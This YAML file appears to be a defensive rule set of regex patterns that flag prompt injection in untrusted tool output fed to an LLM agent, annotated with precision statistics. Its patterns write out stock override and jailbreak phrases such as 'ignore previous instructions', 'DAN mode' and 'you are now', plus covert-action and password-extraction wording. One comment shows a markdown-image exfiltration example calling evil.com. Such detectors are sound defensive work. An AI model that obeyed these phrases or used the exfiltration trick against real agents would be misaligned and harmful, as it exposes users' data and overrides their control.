# Default evidence patterns for L2a data payload detection (Phase 1b).
#
# These patterns detect injection signals in untrusted data segments.
# Action: Evidence — matches are collected but NEVER trigger a block verdict.
# Trust gate: Untrusted — only scanned against untrusted content.
#
# Group A: Structural exploit patterns (high confidence)
# Group B: Statistical anomaly patterns (moderate confidence)

evidence_patterns:
  # ---------------------------------------------------------------
  # Group A: Structural Exploit Patterns
  # ---------------------------------------------------------------

  # Markdown image exfiltration: data egress via image render.
  # Attacker embeds ![img](https://evil.com/steal?data=...) in tool output.
  # Near-zero FPR in data payloads — legitimate tool results rarely contain
  # markdown images with query parameters.
  - category: exfil
    pattern: "!\\[.*\\]\\(https?://[^)]*\\?[^)]*="

  # ReAct agent injection: hijacks agent reasoning loops.
  # Pattern: "Thought: ... Action: ..." spanning lines (multiline).
  # Low FPR in tool results — this is agent framework syntax, not natural text.
  - category: react_inject
    pattern: "(?si)Thought:.*Action:"

  # Instruction bypass phrasing: classic override pattern.
  # Expanded from Vigil's InstructionBypass YARA rule (deadbits/vigil-llm).
  # 11 verbs × 8 adjectives (optional) × 22 objects × 5 suffixes (optional).
  # Corpus validation: 616 mal, 7 ben, 98.9% precision on 17K L3 inbound cases.
  - category: instruction_bypass
    pattern: "(?i)(Ignore|Disregard|Skip|Forget|Neglect|Overlook|Omit|Bypass|Pay no attention to|Do not follow|Do not obey)\\s+(all\\s+)?((prior|previous|preceding|above|foregoing|earlier|initial)\\s+)?(content|text|instructions?|directives?|commands?|context|conversation|inputs?|data|messages?|communication|responses?|requests?|rules|guidelines)(\\s+and (start over|start anew|begin afresh|start from scratch))?"

  # ---------------------------------------------------------------
  # Group B: Statistical Anomaly Patterns
  # ---------------------------------------------------------------

  # Imperative density: injection-specific directive language in data payloads.
  # Narrowed phrase list: removed common benign phrases (you must, you should,
  # your task is, respond with, output the, you will) — these appear in normal
  # chat and documentation. Kept only injection-specific directives.
  # Single-match threshold: corpus analysis shows 97.7% precision at >=1 match
  # with the narrowed list (259 mal, 6 ben across 17K L3 inbound cases).
  - category: imperative_density
    pattern: "(?i)(from now on|you are required to|do not reveal|do not disclose|always respond as|never mention|under no circumstances)"

  # ---------------------------------------------------------------
  # Group C: Social Engineering Patterns
  # ---------------------------------------------------------------

  # Covert instruction: directives to hide actions from the user.
  # Tool results and data payloads should never instruct the model to act
  # secretly or hide information from the user. 80% precision, near-zero FPR.
  # Source: DMPI-PMHFE is_covert feature.
  - category: covert_instruction
    pattern: "(?i)(do (this |it )?secretly|don'?t (tell|reveal|mention|show|disclose) (the user|anyone|them)|hide (this|your|the) (response|output|action)|covertly|without (the user|them|anyone) knowing|between you and me)"

  # Authority claim: social engineering via false authority in data payloads.
  # Tool results don't claim to be administrators or have elevated privileges.
  # 100% precision on eval corpus (17 mal, 0 ben).
  # Source: DMPI-PMHFE is_systemic feature.
  - category: authority_claim
    pattern: "(?i)(I am (the |your )?(administrator|developer|creator|owner|root|supervisor)|admin access granted|authorized (to|by) (the )?(admin|system|developer)|elevated privileges|I have (admin|root|developer) (access|rights|permissions))"

  # ---------------------------------------------------------------
  # Group D: Jailbreak Technique Patterns
  # ---------------------------------------------------------------

  # Developer/DAN mode: explicit jailbreak mode activation.
  # "DAN" = "Do Anything Now", a well-known jailbreak persona.
  # Corpus validation: 145 mal, 1 ben, 99.3% precision on 17K L3 inbound cases.
  - category: developer_mode
    pattern: "(?i)(DAN mode|do anything now|developer mode (enabled|activated|on)|jailbreak(ed)? mode|enable unrestricted mode)"

  # Roleplay hijack: persona reassignment to bypass safety guardrails.
  # Attacker makes the model "become" a character without restrictions.
  # "pretend to be" captures both benign roleplay and malicious persona switch.
  # 87.7% precision, 40 benign FPs (0.44% of benign) — acceptable for evidence.
  # Corpus validation: 285 mal, 40 ben on 17K L3 inbound cases.
  - category: roleplay
    pattern: "(?i)(you are now\\s|pretend (to be|you are)|act as if you (are|were|have)|from now on you (are|will be)\\b)"

  # Output hijack: forcing the model to output specific attacker-controlled text.
  # Broad pattern catches "respond only with", "say exactly", "output only".
  # 80% precision, 13 benign FPs — most are format instructions ("output only JSON").
  # Corpus validation: 52 mal, 13 ben on 17K L3 inbound cases.
  - category: output_hijack
    pattern: "(?i)(respond (only|exclusively) with|output (only|exclusively)|answer (only|exclusively) with|say (only|exactly) |print (only|exactly) )"

  # Hypothetical framing: wrapping harmful requests in fictional/educational context.
  # "For educational purposes only" is a classic jailbreak qualifier.
  # Corpus validation: 21 mal, 2 ben, 91.3% precision on 17K L3 inbound cases.
  - category: hypothetical_framing
    pattern: "(?i)(in a hypothetical|in a fictional (world|scenario|setting)|for (educational|research|academic) purposes only)"

  # ---------------------------------------------------------------
  # Group E: Secret/Password Extraction Patterns
  # ---------------------------------------------------------------

  # Password/secret extraction: data payloads asking to reveal passwords, secret words, keys.
  # Dominant in MossCap (password game) and Gandalf datasets.
  # Requires extraction context: "what is the password", "tell me the password", "reveal the password".
  # Bare "password" alone is too broad (matches "reset my password").
  - category: password_extraction
    pattern: "(?i)((what('s| is) (the |your )?(password|secret word|secret key|magic word|codeword|passphrase))|(tell|give|show|reveal|share|leak|expose|disclose|divulge) .{0,15}(password|secret word|secret key|magic word|codeword|passphrase)|(password|secret word|passphrase) (is|was|equals?|=))"

  # Restriction removal: explicit requests to disable safety guardrails.
  # "no restrictions", "unfiltered", "uncensored" in data payloads signal injection.
  # Corpus validation: 103 mal, 16 ben, 86.6% precision on FN-without-evidence cases.
  - category: restriction_removal
    pattern: "(?i)(no (restrictions|limitations|rules|filters|boundaries|guidelines)|without (restrictions|limitations|rules|filters)|unrestricted|unfiltered|uncensored)"
